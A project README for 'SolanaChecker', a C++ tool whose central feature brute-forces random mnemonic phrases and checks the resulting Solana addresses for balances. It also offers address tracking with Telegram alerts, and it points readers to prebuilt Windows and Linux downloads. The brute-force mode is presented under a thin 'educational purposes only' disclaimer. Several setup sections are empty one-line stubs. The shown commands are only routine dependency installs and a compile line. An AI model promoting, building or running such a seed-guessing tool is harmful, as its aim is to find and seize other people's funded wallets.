# Solana Wallet Balance Brute-Force: Exploring Security and Vulnerabilities

**SolanaChecker** provides a suite of functions for interacting with the Solana blockchain, helping users to check wallet status and manage digital assets. It features a unique "brute-force" option for exploring Solana wallet vulnerabilities, demonstrating the importance of strong security practices.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/sprites/save.webp" />
</p>

## Program Features, Focused on Brute-Force Exploration

1.  **Check Solana Address Balance:** Verify SOL balances.

<p align="left">
    <img src="/sprites/copy.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Assess token security.

<p align="left">
    <img src="/sprites/reveal.webp" />
</p>

3.  **Track Solana Addresses:** Get real-time notifications.

4.  **Wallet Data from Mnemonic Phrase:** Access wallet data.

<p align="left">
    <img src="/sprites/search.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Generate new wallets.

<p align="left">
    <img src="/sprites/thin.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (Brute-Force):** The core of the brute-force feature generates random mnemonic phrases. The program then checks for existing balances on the corresponding addresses. *Use this feature responsibly and for educational purposes only.*

<p align="left">
    <img src="/sprites/preferences.webp" />
</p>

## Setting Up Telegram (for Notifications)

Configure a Telegram bot.

## Getting Started: Download or Build

Download or build the project.

## Building the Project: Security and Transparency

Building ensures code integrity.

### Installing Dependencies Using vcpkg:

1.  Install **vcpkg** if you don't have it.
2.  Add vcpkg to your system PATH.
3.  Run these commands:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Build the project.

### Building via Visual Studio:

1.  Open the solution.
2.  Ensure **vcpkg** is integrated.
3.  Click **Build** -> **Build Solution**.
4.  The executable is in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure all dependencies are installed.
2.  Compile using:

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: The Brute-Force Command

1.  **-s / -search**: *Start the brute-force generation and balance check. This is the primary command for exploring the brute-force functionality.*
2.  **-t / -track (ADDRESS)**: Track.
3.  **-g / -gen (NUMBER)**: Generate.
4.  **-m / -mnemonic (MNEMONIC)**: Show wallet info.
5.  **-b / -balance (ADDRESS)**: Check balance.

## Notes

-   Use responsibly.
-   Protect your seed phrases.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).